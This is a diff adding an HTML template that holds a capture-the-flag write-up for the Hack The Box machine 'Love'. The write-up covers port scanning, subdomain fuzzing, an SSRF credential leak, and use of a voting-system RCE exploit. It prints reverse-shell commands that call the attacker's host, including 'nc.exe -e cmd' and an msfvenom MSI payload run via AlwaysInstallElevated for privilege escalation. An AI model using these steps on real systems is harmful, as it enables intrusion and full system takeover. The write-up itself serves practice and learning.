@@ -1,0 +1,210 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Love</h1>
+    <p class="text">Difficulty : Easy | Difficulty : 3.9</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV &lt;target_ip&gt; --min-rate=2000</u>
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+|_http-title: Voting System using PHP
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
+| Not valid before: 2021-01-18T14:00:16
+|_Not valid after:  2022-01-18T14:00:16
+|_http-title: 403 Forbidden
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
+3306/tcp  open  mysql        MariaDB 10.3.24 or later (unauthorized)
+5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: 403 Forbidden
+5040/tcp  open  unknown
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| tls-alpn: 
+|_  http/1.1
+|_http-title: Not Found
+|_ssl-date: 2025-10-15T08:11:30+00:00; +21m34s from scanner time.
+| ssl-cert: Subject: commonName=LOVE
+| Subject Alternative Name: DNS:LOVE, DNS:Love
+| Not valid before: 2021-04-11T14:39:19
+|_Not valid after:  2024-04-10T14:39:19
+7680/tcp  open  pando-pub?
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC</code></pre></div>
+
+
+<p class="text">There are many open ports. However, there is no interesting application and almost all open ports are HTTP or Windows system applications. Therefore, we can focus on HTTPs right now.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/love/1-home.png' %}" alt="">
+    <p class="text">Opening http navigated me to login form. I didn't realize that the voting system is the name of the web software, but it is. I will research if there is any vulnerability. </p>
+</div>
+
+<p class="text">With the keyword 'voting system vulnerability' returned <a href="https://www.exploit-db.com/exploits/49445">this poc</a>. However, this payload requires me credential, and I don't have it. Therefore, I need to dive this website deeper.</p>
+<p class="text">I enumerated the directories, but it doesn't return any interesting information. So, I will enumerate subdomains.</p>
+
+
+<div class="code-box"><pre><code>└─$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://www.love.htb -H "Host:FUZZ.love.htb" -mc 200 -fw 654 -s
+staging</code></pre></div>
+
+<p class="text">This code returned subdomain <u>staging</u>.</p>
+
+
+<div class="code-box">└─$ <u>echo 'target_ip staging.love.htb' | sudo tee -a /etc/hosts</u></div>
+
+<h2 class="subtitle">Foothold</h2>
+<div class="img">
+    <img src="{% static 'EthHack/images/love/2-home.png' %}" alt="">
+    <p class="text">This page seems to display other website's page with arbitrary url. We saw several http ports are open, so let's check if we can query localhost webpage on the target machine.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/love/3-leak.png' %}" alt="">
+    <p class="text">As I intended, I could see the webpage where display admin credential on the port 5000. (http://127.0.0.1:5000)</p>
+</div>
+
+<p class="text">Because we got credential, we might be able to use payload we found.</p>
+<p class="text">Before using it, there are several code we have to modify.</p>
+
+<div class="code-box"><pre><code># --- Edit your settings here ----
+IP = "192.168.1.207" # Website's URL
+USERNAME = "potter" #Auth username
+PASSWORD = "password" # Auth Password
+REV_IP = "192.168.1.207" # Reverse shell IP
+REV_PORT = "8888" # Reverse port 
+# --------------------------------
+
+INDEX_PAGE = f"http://{IP}/admin/index.php"
+LOGIN_URL = f"http://{IP}/admin/login.php"
+VOTE_URL = f"http://{IP}/admin/voters_add.php"
+CALL_SHELL = f"http://{IP}/images/shell.php"</code></pre></div>
+
+<p class="text">As the paylaod states, we have to modify settings, as the same, our target machine doesn't have path directory <u>votesystem</u>, so we have to remove this from URLs.</p>
+
+<div class="code-box"><pre><code>└─$ python3 exploit.py
+Start a NC listner on the port you choose above and run...
+Logged in
+Poc sent successfully</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.74.114] 55938
+b374k shell : connected
+
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\omrs\images></code></pre></div>
+
+<p class="text">We got reverse shell. You can find user flag in \C:\Users\Phoebe\Desktop</p>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">Because I prefer stable connection, I re-connect user with nc64.exe. For that, I will use impacket-smbserver.</p>
+
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows/nc.exe]
+└─$ impacket-smbserver share . -smb2support -username a -password a 
+
+C:\Users\Phoebe\Desktop>net use \\10.10.16.40\share /user:a a
+C:\Users\Phoebe\Desktop>copy \\10.10.16.40\share\nc64.exe C:\ProgramData\nc.exe</code></pre></div>
+
+
+
+<div class="code-box"><pre><code>C:\ProgramData> <u>C:\ProgramData\nc.exe -e cmd 10.10.16.40 4444</u>
+    
+    
+└─$ <u>nc -lvnp 4444</u>
+listening on [any] 4444 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.74.114] 55920
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\ProgramData></code></pre></div>
+
+<p class="text">Then, let's find a vector for privilege escalation.</p>
+
+
+<p class="text">While I checking privilege for the user, I found below information.</p>
+<div class="code-box"><pre><code>C:\Users\Phoebe\Desktop>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1</code></pre></div>
+
+<p class="text">Also...</p>
+
+<div class="code-box"><pre><code>PS C:\xampp\htdocs\omrs\images> get-applockerpolicy -effective | select -expandproperty rulecollections
+
+PathConditions      : {%WINDIR%\Installer\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 5b290184-345a-4453-b184-45305f6d9a54
+Name                : (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
+Description         : Allows members of the Everyone group to run all Windows Installer files located in 
+                      %systemdrive%\Windows\Installer.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow</code></pre></div>
+
+    <p class="text">This means I can install msi as administratro. Therefore, If I could construct malicious msi file, I can get reverse shell of administrator.</p>
+
+
+    <div class="code-box"><pre><code>└─$ <u>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.40 LPORT=4444 -f msi -o reverse.msi</u>
+└─$ <u>impacket-smbserver share . -smb2support -username a -password a</u></code></pre></div>
+
+<div class="code-box"><pre><code>PS C:\xampp\htdocs\omrs\images> net use \\10.10.16.40\share /user:a a
+PS C:\xampp\htdocs\omrs\images> copy \\10.10.16.40\share\reverse.msi reverse.msi</code></pre></div>
+
+<p class="text">Then, we can use reverse.msi with <u>msiexec</u> command.</p>
+
+<div class="code-box"><pre><code>PS C:\xampp\htdocs\omrs\images> msiexec /quiet /i reverse.msi
+msiexec /quiet /i reverse.msi</code></pre></div>
+
+<p class="text">Then, It returns reverse shell on my port 4444.</p>
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.74.114] 55925
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32></code></pre></div>
+
+
+<p class="text">You can locate root flag on <u>C:\Users\Administrator\Desktop</u>.</p>
+
+</body>
+</html>
